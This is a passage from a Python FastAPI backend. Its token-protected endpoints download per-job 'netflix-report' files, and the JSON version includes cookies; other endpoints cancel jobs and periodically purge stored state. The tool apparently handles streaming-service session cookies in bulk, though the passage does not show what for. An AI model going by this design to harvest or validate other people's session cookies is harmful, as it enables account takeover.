    return PlainTextResponse(
        build_report(job),
        headers={"Content-Disposition": f'attachment; filename="netflix-report-{job_id}.txt"'},
    )


@app.get("/api/jobs/{job_id}/report.json", dependencies=[Depends(require_token)])
async def report_json(job_id: str) -> JSONResponse:
    job = JOBS.get(job_id)
    if job is None:
        raise HTTPException(status_code=404, detail="Job not found")
    return JSONResponse(
        job.public(with_cookies=True),
        headers={"Content-Disposition": f'attachment; filename="netflix-report-{job_id}.json"'},
    )


@app.delete("/api/jobs/{job_id}", dependencies=[Depends(require_token)])
async def cancel_job(job_id: str) -> dict:
    with JOBS_LOCK:
        job = JOBS.get(job_id)
    if job is None:
        if load_snapshot(job_id) is None:
            raise HTTPException(status_code=404, detail="Job not found")
        drop_snapshot(job_id)
        return {"cancelled": job_id}
    job.cancelled = True
    if job.status in {"queued", "running"}:
        job.status = "cancelled"
        job.finished_at = job.finished_at or time.time()
    save_snapshot(job, force=True)
    return {"cancelled": job_id}


@app.on_event("startup")
async def janitor() -> None:
    async def loop() -> None:
        while True:
            await asyncio.sleep(120)
            _purge()

    asyncio.create_task(loop())
